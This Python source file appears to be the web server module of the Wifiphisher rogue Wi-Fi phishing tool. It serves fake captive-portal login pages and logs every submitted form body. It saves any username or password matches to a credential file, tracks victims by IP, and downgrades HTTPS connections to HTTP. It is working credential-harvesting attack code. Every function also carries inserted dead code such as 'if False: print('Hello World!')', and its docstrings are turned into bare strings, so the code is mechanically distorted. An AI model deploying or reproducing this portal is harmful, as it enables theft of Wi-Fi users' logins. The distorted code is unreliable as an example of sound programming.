import datetime
import json
import logging
import os.path
import re
import time
import asyncio
import tornado.ioloop
import tornado.web
import tornado.platform.asyncio
import wifiphisher.common.constants as constants
import wifiphisher.common.extensions as extensions
import wifiphisher.common.uimethods as uimethods
import wifiphisher.common.victim as victim
from tornado.escape import json_decode
asyncio.set_event_loop_policy(tornado.platform.asyncio.AnyThreadEventLoopPolicy())
hn = logging.NullHandler()
hn.setLevel(logging.DEBUG)
logging.getLogger('tornado.access').disabled = True
logging.getLogger('tornado.general').disabled = True
template = False
terminate = False
creds = []
logger = logging.getLogger(__name__)
credential_log_path = None

class DowngradeToHTTP(tornado.web.RequestHandler):

    def get(self):
        if False:
            print('Hello World!')
        port = self.application.settings.get('port')
        self.redirect('http://10.0.0.1:{}/'.format(port))

class BackendHandler(tornado.web.RequestHandler):
    """
    Validate the POST requests from client by the uimethods
    """

    def initialize(self, em):
        if False:
            print('Hello World!')
        '\n        :param self: A tornado.web.RequestHandler object\n        :param em: An extension manager object\n        :type self: tornado.web.RequestHandler\n        :type em: ExtensionManager\n        :return: None\n        :rtype: None\n        '
        self.em = em

    def post(self):
        if False:
            i = 10
            return i + 15
        '\n        :param self: A tornado.web.RequestHandler object\n        :type self: tornado.web.RequestHandler\n        :return: None\n        :rtype: None\n        ..note: override the post method to do the verification\n        '
        json_obj = json_decode(self.request.body)
        response_to_send = {}
        backend_methods = self.em.get_backend_funcs()
        for func_name in list(json_obj.keys()):
            if func_name in backend_methods:
                callback = getattr(backend_methods[func_name], func_name)
                response_to_send[func_name] = callback(json_obj[func_name])
            else:
                response_to_send[func_name] = 'NotFound'
        self.write(json.dumps(response_to_send))

class CaptivePortalHandler(tornado.web.RequestHandler):

    def get(self):
        if False:
            i = 10
            return i + 15
        '\n        Override the get method\n\n        :param self: A tornado.web.RequestHandler object\n        :type self: tornado.web.RequestHandler\n        :return: None\n        :rtype: None\n        '
        requested_file = self.request.path[1:]
        template_directory = template.get_path()
        if os.path.isfile(template_directory + requested_file):
            render_file = requested_file
        else:
            render_file = 'index.html'
        file_path = template_directory + render_file
        self.render(file_path, **template.get_context())
        log_file_path = '/tmp/wifiphisher-webserver.tmp'
        with open(log_file_path, 'a+') as log_file:
            log_file.write('GET request from {0} for {1}\n'.format(self.request.remote_ip, self.request.full_url()))
        logger.info('GET request from %s for %s', self.request.remote_ip, self.request.full_url())
        victims_instance = victim.Victims.get_instance()
        victims_instance.associate_victim_ip_to_os(self.request.remote_ip, self.request.full_url())

    def post(self):
        if False:
            while True:
                i = 10
        '\n        Override the post method\n\n        :param self: A tornado.web.RequestHandler object\n        :type self: tornado.web.RequestHandler\n        :return: None\n        :rtype: None\n        ..note: we only serve the Content-Type which starts with\n        "application/x-www-form-urlencoded" as a valid post request\n        '
        global terminate
        try:
            content_type = self.request.headers['Content-Type']
        except KeyError:
            return
        try:
            if content_type.startswith(constants.VALID_POST_CONTENT_TYPE):
                post_data = tornado.escape.url_unescape(self.request.body)
                log_file_path = '/tmp/wifiphisher-webserver.tmp'
                with open(log_file_path, 'a+') as log_file:
                    log_file.write('POST request from {0} with {1}\n'.format(self.request.remote_ip, post_data))
                    logger.info('POST request from %s with %s', self.request.remote_ip, post_data)
                if re.search(constants.REGEX_PWD, post_data, re.IGNORECASE) or re.search(constants.REGEX_UNAME, post_data, re.IGNORECASE):
                    if credential_log_path:
                        with open(credential_log_path, 'a+') as credential_log:
                            credential_log.write('{} {}'.format(time.strftime(constants.CREDENTIALS_DATETIME_FORMAT), 'POST request from {0} with {1}\n'.format(self.request.remote_ip, post_data)))
                    creds.append(post_data)
                    terminate = True
        except UnicodeDecodeError:
            pass
        requested_file = self.request.path[1:]
        template_directory = template.get_path()
        if os.path.isfile(template_directory + requested_file):
            render_file = requested_file
        else:
            render_file = 'index.html'
        file_path = template_directory + render_file
        self.render(file_path, **template.get_context())
        victims_instance = victim.Victims.get_instance()
        victims_instance.associate_victim_ip_to_os(self.request.remote_ip, self.request.full_url())

def runHTTPServer(ip, port, ssl_port, t, em):
    if False:
        print('Hello World!')
    global template
    template = t
    for f in em.get_ui_funcs():
        setattr(uimethods, f.__name__, f)
    app = tornado.web.Application([('/backend/.*', BackendHandler, {'em': em}), ('/.*', CaptivePortalHandler)], template_path=template.get_path(), static_path=template.get_path_static(), compiled_template_cache=False, ui_methods=uimethods)
    app.listen(port, address=ip)
    ssl_app = tornado.web.Application([('/.*', DowngradeToHTTP)], port=port)
    https_server = tornado.httpserver.HTTPServer(ssl_app, ssl_options={'certfile': constants.PEM, 'keyfile': constants.PEM})
    https_server.listen(ssl_port, address=ip)
    tornado.ioloop.IOLoop.instance().start()